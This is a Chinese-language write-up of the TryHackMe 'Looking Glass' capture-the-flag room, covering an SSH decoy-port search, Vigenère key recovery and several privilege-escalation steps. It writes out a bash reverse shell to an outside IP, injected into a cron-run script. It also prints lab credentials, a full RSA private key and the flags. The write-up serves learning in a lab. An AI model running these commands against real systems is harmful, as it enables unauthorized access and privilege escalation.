# 服务发现
```
┌──(root💀kali)-[~/tryhackme]
└─#  nmap -sV -Pn 10.10.189.27    
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-08 04:11 EDT
Nmap scan report for 10.10.163.86
Host is up (1.1s latency).
Not shown: 916 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
9000/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9001/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9002/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9003/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9009/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9010/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9011/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9040/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9050/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9071/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9080/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9081/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9090/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9091/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9099/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9100/tcp  open  jetdirect?
9101/tcp  open  jetdirect?
9102/tcp  open  jetdirect?
9103/tcp  open  jetdirect?
9110/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9111/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9200/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9207/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9220/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9290/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9415/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9418/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9485/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9500/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9502/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9503/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9535/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9575/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9593/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9594/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9595/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9618/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9666/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9876/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9877/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9878/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9898/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9900/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9917/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9929/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9943/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9944/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9968/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9998/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9999/tcp  open  ssh        Dropbear sshd (protocol 2.0)
10000/tcp open  ssh        Dropbear sshd (protocol 2.0)
10001/tcp open  ssh        Dropbear sshd (protocol 2.0)
10002/tcp open  ssh        Dropbear sshd (protocol 2.0)
10003/tcp open  ssh        Dropbear sshd (protocol 2.0)
10004/tcp open  ssh        Dropbear sshd (protocol 2.0)
10009/tcp open  ssh        Dropbear sshd (protocol 2.0)
10010/tcp open  ssh        Dropbear sshd (protocol 2.0)
10012/tcp open  ssh        Dropbear sshd (protocol 2.0)
10024/tcp open  ssh        Dropbear sshd (protocol 2.0)
10025/tcp open  ssh        Dropbear sshd (protocol 2.0)
10082/tcp open  ssh        Dropbear sshd (protocol 2.0)
10180/tcp open  ssh        Dropbear sshd (protocol 2.0)
10215/tcp open  ssh        Dropbear sshd (protocol 2.0)
10243/tcp open  ssh        Dropbear sshd (protocol 2.0)
10566/tcp open  ssh        Dropbear sshd (protocol 2.0)
10616/tcp open  ssh        Dropbear sshd (protocol 2.0)
10617/tcp open  ssh        Dropbear sshd (protocol 2.0)
10621/tcp open  ssh        Dropbear sshd (protocol 2.0)
10626/tcp open  ssh        Dropbear sshd (protocol 2.0)
10628/tcp open  ssh        Dropbear sshd (protocol 2.0)
10629/tcp open  ssh        Dropbear sshd (protocol 2.0)
10778/tcp open  ssh        Dropbear sshd (protocol 2.0)
11110/tcp open  ssh        Dropbear sshd (protocol 2.0)
11111/tcp open  ssh        Dropbear sshd (protocol 2.0)
11967/tcp open  ssh        Dropbear sshd (protocol 2.0)
12000/tcp open  ssh        Dropbear sshd (protocol 2.0)
12174/tcp open  ssh        Dropbear sshd (protocol 2.0)
12265/tcp open  ssh        Dropbear sshd (protocol 2.0)
12345/tcp open  ssh        Dropbear sshd (protocol 2.0)
13456/tcp open  ssh        Dropbear sshd (protocol 2.0)
13722/tcp open  ssh        Dropbear sshd (protocol 2.0)
13782/tcp open  ssh        Dropbear sshd (protocol 2.0)
13783/tcp open  ssh        Dropbear sshd (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

太操蛋了。。。
看上去开了很多ssh端口，开启```-p-```重新扫了一次，扫描出更多ssh端口

尝试用连接上面的ssh端口，会不断的提示```Higher```或者```lower```

我们当然不需要一个个端口去测试，只需要不停的折半查找，那么在对数次数内我们就可以找到真实端口
```
┌──(root💀kali)-[~/tryhackme/lookingglass]
└─#  ssh root@10.10.189.27 -p 12000
The authenticity of host '[10.10.189.27]:12000 ([10.10.189.27]:12000)' can't be established.
RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.189.27]:12000' (RSA) to the list of known hosts.
Lower
Connection to 10.10.189.27 closed.
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/tryhackme/lookingglass]
└─#  ssh root@10.10.189.27 -p 12174
The authenticity of host '[10.10.189.27]:12174 ([10.10.189.27]:12174)' can't be established.
RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.189.27]:12174' (RSA) to the list of known hosts.
Higher
Connection to 10.10.189.27 closed.
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/tryhackme/lookingglass]
└─#  ssh root@10.10.189.27 -p 12100
The authenticity of host '[10.10.189.27]:12100 ([10.10.189.27]:12100)' can't be established.
RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.189.27]:12100' (RSA) to the list of known hosts.
Higher
Connection to 10.10.189.27 closed.
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/tryhackme/lookingglass]
└─#  ssh root@10.10.189.27 -p 12050
The authenticity of host '[10.10.189.27]:12050 ([10.10.189.27]:12050)' can't be established.
RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.189.27]:12050' (RSA) to the list of known hosts.
Higher
Connection to 10.10.189.27 closed.
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/tryhackme/lookingglass]
└─#  ssh root@10.10.189.27 -p 12025
The authenticity of host '[10.10.189.27]:12025 ([10.10.189.27]:12025)' can't be established.
RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.189.27]:12025' (RSA) to the list of known hosts.
Lower
Connection to 10.10.189.27 closed.
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/tryhackme/lookingglass]
└─#  ssh root@10.10.189.27 -p 12030
The authenticity of host '[10.10.189.27]:12030 ([10.10.189.27]:12030)' can't be established.
RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.189.27]:12030' (RSA) to the list of known hosts.
Higher
Connection to 10.10.189.27 closed.

```
# 最后定位到端口：```12027```
注意，这个端口每次reboot的时候都会变化

```
┌──(root💀kali)-[~/tryhackme/lookingglass]
└─#  ssh root@10.10.189.27 -p 12027
The authenticity of host '[10.10.189.27]:12027 ([10.10.189.27]:12027)' can't be established.
RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.189.27]:12027' (RSA) to the list of known hosts.
You've found the real service.
Solve the challenge to get access to the box
Jabberwocky
'Mdes mgplmmz, cvs alv lsmtsn aowil
Fqs ncix hrd rxtbmi bp bwl arul;
Elw bpmtc pgzt alv uvvordcet,
Egf bwl qffl vaewz ovxztiql.

'Fvphve ewl Jbfugzlvgb, ff woy!
Ioe kepu bwhx sbai, tst jlbal vppa grmjl!
Bplhrf xag Rjinlu imro, pud tlnp
Bwl jintmofh Iaohxtachxta!'

Oi tzdr hjw oqzehp jpvvd tc oaoh:
Eqvv amdx ale xpuxpqx hwt oi jhbkhe--
Hv rfwmgl wl fp moi Tfbaun xkgm,
Puh jmvsd lloimi bp bwvyxaa.

Eno pz io yyhqho xyhbkhe wl sushf,
Bwl Nruiirhdjk, xmmj mnlw fy mpaxt,
Jani pjqumpzgn xhcdbgi xag bjskvr dsoo,
Pud cykdttk ej ba gaxt!

Vnf, xpq! Wcl, xnh! Hrd ewyovka cvs alihbkh
Ewl vpvict qseux dine huidoxt-achgb!
Al peqi pt eitf, ick azmo mtd wlae
Lx ymca krebqpsxug cevm.

'Ick lrla xhzj zlbmg vpt Qesulvwzrr?
Cpqx vw bf eifz, qy mthmjwa dwn!
V jitinofh kaz! Gtntdvl! Ttspaj!'
Wl ciskvttk me apw jzn.

'Awbw utqasmx, tuh tst zljxaa bdcij
Wph gjgl aoh zkuqsi zg ale hpie;
Bpe oqbzc nxyi tst iosszqdtz,
Eew ale xdte semja dbxxkhfe.
Jdbr tivtmi pw sxderpIoeKeudmgdstd
Enter Secret:
```

现在我们拿到一个加密文本。```Jabberwocky```在爱丽丝的故事里是一首废话诗
关于这个背景可以参考[维基百科](https://en.wikipedia.org/wiki/Jabberwocky)

根据上面的背景知识我们可以拿到一段明文：
```
'Twas brillig, and the slithy toves
Did gyre and gimble in the wabe
All mimsy were the borogoves,
And the mome raths outgrabe.
```

对应的密文就是上面的第一段：
```
'Mdes mgplmmz, cvs alv lsmtsn aowil
Fqs ncix hrd rxtbmi bp bwl arul;
Elw bpmtc pgzt alv uvvordcet,
Egf bwl qffl vaewz ovxztiql.
```

我们猜测这里用的是维吉利亚加密，那么在知道明文和密文的情况下，我们如何知道加密的秘钥？

我搜索到了[这个页面](https://www.reddit.com/r/codes/comments/ii51oo/textbased_cipher/)

这里说了一句:
>Take the ciphertext and decrypt it with the plaintext as the key. If it was vigenere, you'll see the real key pop out. Which is the case here.

用明文作为秘钥，解密已加密的文本，得出来的就是秘钥

去到[这个网站](http://www.metools.info/code/c71.html)

我们把头两行加密文本去除标点以后作为待解密文本：
```MdesmgplmmzcvsalvlsmtsnaowilFqsncixhrdrxtbmibpbwlarul```

把头两行的明文去除标点以后作为解密的秘钥:
```TwasbrilligandtheslithytovesDidgyreandgimbleinthewabe```

解密出来以后是：
```ThealphabetcipherthealphabetCipherthealphabetcipherth```

我们观察，期中```thealphabetcipher```这个字符串在解密密文里反复出现，所以这个就是我们的解密秘钥


# 我们用上面的秘钥解密整个加密诗文

```
Twas brillig, and the slithy toves
Did gyre and gimble in the wabe;
All mimsy were the borogoves,
And the mome raths outgrabe.

'Beware the Jabberwock, my son!
The jaws that bite, the claws that catch!
Beware the Jubjub bird, and shun
The frumious Bandersnatch!'

He took his vorpal sword in hand:
Long time the manxome foe he sought--
So rested he by the Tumtum tree,
And stood awhile in thought.

And as in uffish thought he stood,
The Jabberwock, with eyes of flame,
Came whiffling through the tulgey wood,
And burbled as it came!

One, two! One, two! And through and through
The vorpal blade went snicker-snack!
He left it dead, and with its head
He went galumphing back.

'And hast thou slain the Jabberwock?
Come to my arms, my beamish boy!
O frabjous day! Callooh! Callay!'
He chortled in his joy.

'Twas brillig, and the slithy toves
Did gyre and gimble in the wabe;
All mimsy were the borogoves,
And the mome raths outgrabe.
Your secret is bewareTheJabberwock
```

secret是：```bewareTheJabberwock```

# ssh里填入secret，得到一个ssh的登陆凭证
小声bb：这个ssh密码每次reboot的时候也会变化，所以万不得已千万不要重启，不然上面猜端口又要重来一次。。。
```
Enter Secret:
jabberwock:InventedBackwardsGreedilyYours

```


# user 1：jabberwock
登陆ssh，查看user.txt
```
┌──(root💀kali)-[~/tryhackme/lookingglass]
└─#  ssh jabberwock@10.10.189.27         
jabberwock@10.10.189.27's password: 
Last login: Fri Jul  3 03:05:33 2020 from 192.168.170.1
jabberwock@looking-glass:~$ ls
poem.txt  twasBrillig.sh  user.txt
jabberwock@looking-glass:~$ cat user.txt 
}32a911966cab2d643f5d57d9e0173d56{mht
```

按照这个房间的尿性，显然这也不是一个真实的user flag

去到[这个网站](https://string-functions.com/reverse.aspx),得到一个reverse的串就是user flag

# 查看本用户的root权限，可以使用reboot命令

```
jabberwock@looking-glass:~$ sudo -l
Matching Defaults entries for jabberwock on looking-glass:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jabberwock may run the following commands on looking-glass:
    (root) NOPASSWD: /sbin/reboot

```

查看定时任务，tweedledum这个用户，每次reboot的时候都会执行``` /home/jabberwock/twasBrillig.sh```

```
jabberwock@looking-glass:~$ cat /etc/crontab 
#  /etc/crontab: system-wide crontab
#  Unlike any other crontab you don't have to run the `crontab'
#  command to install the new version when you edit this file
#  and files in /etc/cron.d. These files also have username fields,
#  that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

#  m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# 
@reboot tweedledum bash /home/jabberwock/twasBrillig.sh
```

我们把下面的payload写进``` /home/jabberwock/twasBrillig.sh```
```
jabberwock@looking-glass:~$ echo "bash -i >& /dev/tcp/10.13.21.169/4242 0>&1">>/home/jabberwock/twasBrillig.sh
jabberwock@looking-glass:~$ cat /home/jabberwock/twasBrillig.sh
wall $(cat /home/jabberwock/poem.txt)
bash -i >& /dev/tcp/10.13.21.169/4242 0>&1
```

另外开启一个监听窗口，reboot这个机器....

拿到另一个用户```tweedledum```的shell
# user 2 tweedledum
```
┌──(root💀kali)-[~/tryhackme/lookingglass]
└─#  nc -lnvp 4242                                                                                                                                                                                                                       1 ⨯
listening on [any] 4242 ...
connect to [10.13.21.169] from (UNKNOWN) [10.10.189.27] 52236
bash: cannot set terminal process group (881): Inappropriate ioctl for device
bash: no job control in this shell
tweedledum@looking-glass:~$ whoami
whoami
tweedledum
tweedledum@looking-glass:~$ id
id
uid=1002(tweedledum) gid=1002(tweedledum) groups=1002(tweedledum)
tweedledum@looking-glass:~$ 

```
tweedledum用于bash的root权限，但是需要密码

```
tweedledum@looking-glass:~$ sudo -l
sudo -l
Matching Defaults entries for tweedledum on looking-glass:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tweedledum may run the following commands on looking-glass:
    (tweedledee) NOPASSWD: /bin/bash

$ python3 -c 'import pty; pty.spawn("/bin/sh")'
$ sudo /bin/bash
sudo /bin/bash
[sudo] password for tweedledum: 

Sorry, try again.
[sudo] password for tweedledum: 

Sorry, try again.
[sudo] password for tweedledum: 


```


在此目录下有两个文件
```
$ ls
ls
humptydumpty.txt  poem.txt
$ cat humptydumpty.txt
cat humptydumpty.txt
dcfff5eb40423f055a4cd0a8d7ed39ff6cb9816868f5766b4088b9e9906961b9
7692c3ad3540bb803c020b3aee66cd8887123234ea0c6e7143c0add73ff431ed
28391d3bc64ec15cbb090426b04aa6b7649c3cc85f11230bb0105e02d15e3624
b808e156d18d1cecdcc1456375f8cae994c36549a07c8c2315b473dd9d7f404f
fa51fd49abf67705d6a35d18218c115ff5633aec1f9ebfdc9d5d4956416f57f6
b9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0
5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b
$ cat poem.txt
cat poem.txt
     'Tweedledum and Tweedledee
      Agreed to have a battle;
     For Tweedledum said Tweedledee
      Had spoiled his nice new rattle.

     Just then flew down a monstrous crow,
      As black as a tar-barrel;
     Which frightened both the heroes so,
      They quite forgot their quarrel.'
```

humptydumpty.txt里的是sha256加密密文，去到这个[网站](https://www.somd5.com/)解密后的结果如下：

>dcfff5eb40423f055a4cd0a8d7ed39ff6cb9816868f5766b4088b9e9906961b9     ```maybe```
>7692c3ad3540bb803c020b3aee66cd8887123234ea0c6e7143c0add73ff431ed     ```one```
>28391d3bc64ec15cbb090426b04aa6b7649c3cc85f11230bb0105e02d15e3624     ```of```
>b808e156d18d1cecdcc1456375f8cae994c36549a07c8c2315b473dd9d7f404f     ```these```
>fa51fd49abf67705d6a35d18218c115ff5633aec1f9ebfdc9d5d4956416f57f6     ```is```
>b9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0     ```the```
>5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8     ```password```
>7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b     ```(这个解不出来..)```

```7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b```看上去像sha256，但其实是hex
在hackbar里面选择ENCODING->Hexadecimal decode

得到明文:```the password is zyxwvutsrqponmlk```

查看```/etc/passwd```，```humptydumpty```是期中一个用户
```
$ cat /etc/passwd
cat /etc/passwd
...
...
tryhackme:x:1000:1000:TryHackMe:/home/tryhackme:/bin/bash
jabberwock:x:1001:1001:,,,:/home/jabberwock:/bin/bash
tweedledum:x:1002:1002:,,,:/home/tweedledum:/bin/bash
tweedledee:x:1003:1003:,,,:/home/tweedledee:/bin/bash
humptydumpty:x:1004:1004:,,,:/home/humptydumpty:/bin/bash
alice:x:1005:1005:Alice,,,:/home/alice:/bin/bash
```

# user 3 humptydumpty

切换到humptydumpty的账号
```
su humptydumpty
Password: zyxwvutsrqponmlk
humptydumpty@looking-glass:/home$ cd humptydumpty
cd humptydumpty
humptydumpty@looking-glass:~$ ls
ls
poetry.txt

```

在home目录查看用户权限，其他用户组对alice都有执行权限
```
humptydumpty@looking-glass:/home$ ls -al
ls -al
total 32
drwxr-xr-x  8 root         root         4096 Jul  3  2020 .
drwxr-xr-x 24 root         root         4096 Jul  2  2020 ..
drwx--x--x  6 alice        alice        4096 Jul  3  2020 alice
drwx------  3 humptydumpty humptydumpty 4096 Oct  9 08:52 humptydumpty
drwxrwxrwx  6 jabberwock   jabberwock   4096 Oct  9 07:32 jabberwock
drwx------  5 tryhackme    tryhackme    4096 Jul  3  2020 tryhackme
drwx------  3 tweedledee   tweedledee   4096 Jul  3  2020 tweedledee
drwx------  2 tweedledum   tweedledum   4096 Jul  3  2020 tweedledum
```

这里我是参考大佬的writeup的，很trick的是可以查看到alice的ssh私钥文件。。
```
cat alice/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpgIBAAKCAQEAxmPncAXisNjbU2xizft4aYPqmfXm1735FPlGf4j9ExZhlmmD
NIRchPaFUqJXQZi5ryQH6YxZP5IIJXENK+a4WoRDyPoyGK/63rXTn/IWWKQka9tQ
2xrdnyxdwbtiKP1L4bq/4vU3OUcA+aYHxqhyq39arpeceHVit+jVPriHiCA73k7g
HCgpkwWczNa5MMGo+1Cg4ifzffv4uhPkxBLLl3f4rBf84RmuKEEy6bYZ+/WOEgHl
fks5ngFniW7x2R3vyq7xyDrwiXEjfW4yYe+kLiGZyyk1ia7HGhNKpIRufPdJdT+r
NGrjYFLjhzeWYBmHx7JkhkEUFIVx6ZV1y+gihQIDAQABAoIBAQDAhIA5kCyMqtQj
X2F+O9J8qjvFzf+GSl7lAIVuC5Ryqlxm5tsg4nUZvlRgfRMpn7hJAjD/bWfKLb7j
/pHmkU1C4WkaJdjpZhSPfGjxpK4UtKx3Uetjw+1eomIVNu6pkivJ0DyXVJiTZ5jF
ql2PZTVpwPtRw+RebKMwjqwo4k77Q30r8Kxr4UfX2hLHtHT8tsjqBUWrb/jlMHQO
zmU73tuPVQSESgeUP2jOlv7q5toEYieoA+7ULpGDwDn8PxQjCF/2QUa2jFalixsK
WfEcmTnIQDyOFWCbmgOvik4Lzk/rDGn9VjcYFxOpuj3XH2l8QDQ+GO+5BBg38+aJ
cUINwh4BAoGBAPdctuVRoAkFpyEofZxQFqPqw3LZyviKena/HyWLxXWHxG6ji7aW
DmtVXjjQOwcjOLuDkT4QQvCJVrGbdBVGOFLoWZzLpYGJchxmlR+RHCb40pZjBgr5
8bjJlQcp6pplBRCF/OsG5ugpCiJsS6uA6CWWXe6WC7r7V94r5wzzJpWBAoGBAM1R
aCg1/2UxIOqxtAfQ+WDxqQQuq3szvrhep22McIUe83dh+hUibaPqR1nYy1sAAhgy
wJohLchlq4E1LhUmTZZquBwviU73fNRbID5pfn4LKL6/yiF/GWd+Zv+t9n9DDWKi
WgT9aG7N+TP/yimYniR2ePu/xKIjWX/uSs3rSLcFAoGBAOxvcFpM5Pz6rD8jZrzs
SFexY9P5nOpn4ppyICFRMhIfDYD7TeXeFDY/yOnhDyrJXcbOARwjivhDLdxhzFkx
X1DPyif292GTsMC4xL0BhLkziIY6bGI9efC4rXvFcvrUqDyc9ZzoYflykL9KaCGr
+zlCOtJ8FQZKjDhOGnDkUPMBAoGBAMrVaXiQH8bwSfyRobE3GaZUFw0yreYAsKGj
oPPwkhhxA0UlXdITOQ1+HQ79xagY0fjl6rBZpska59u1ldj/BhdbRpdRvuxsQr3n
aGs//N64V4BaKG3/CjHcBhUA30vKCicvDI9xaQJOKardP/Ln+xM6lzrdsHwdQAXK
e8wCbMuhAoGBAOKy5OnaHwB8PcFcX68srFLX4W20NN6cFp12cU2QJy2MLGoFYBpa
dLnK/rW4O0JxgqIV69MjDsfRn1gZNhTTAyNnRMH1U7kUfPUB2ZXCmnCGLhAGEbY9
k6ywCnCtTz2/sNEgNcx9/iZW+yVEm/4s9eonVimF+u19HJFOPJsAYxx0
-----END RSA PRIVATE KEY-----
```

把上面信息复制到本地成id_rsa文件，用ssh登录alice账号
# user 4 alice
```
┌──(root💀kali)-[~/tryhackme/lookingglass]
└─#  chmod 600 id_rsa         
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/tryhackme/lookingglass]
└─#  ssh -i id_rsa alice@10.10.189.27  
Last login: Fri Jul  3 02:42:13 2020 from 192.168.170.1
alice@looking-glass:~$ id
uid=1005(alice) gid=1005(alice) groups=1005(alice)
alice@looking-glass:~$ whoami
alice
```

不能使用sudo -l，因为不知道密码
有一个txt文件，但是没有什么卵用不用管

全局寻找alice相关的文件
```
alice@looking-glass:/$ find / -name *alice* -type f 2>/dev/null
/etc/sudoers.d/alice
````

查看这个文件,可以使用bash
```
alice@looking-glass:/$ cat /etc/sudoers.d/alice 
alice ssalg-gnikool = (root) NOPASSWD: /bin/bash
```

在上面这条命令里

>alice 用户名
>ssalg-gnikool 主机名
>/bin/bash 可以执行的命令


# 提权到root。
>-h参数有帮助菜单（display gelp message and exit），也有在主机上运行命令的意思（run command on host）
```
alice@looking-glass:/$ sudo -h ssalg-gnikool /bin/bash
sudo: unable to resolve host ssalg-gnikool
root@looking-glass:/#  id
uid=0(root) gid=0(root) groups=0(root)
root@looking-glass:/#  cat /root/root.txt
}f3dae6dec817ad10b750d79f6b7332cb{mht
```

root flag也需要reverse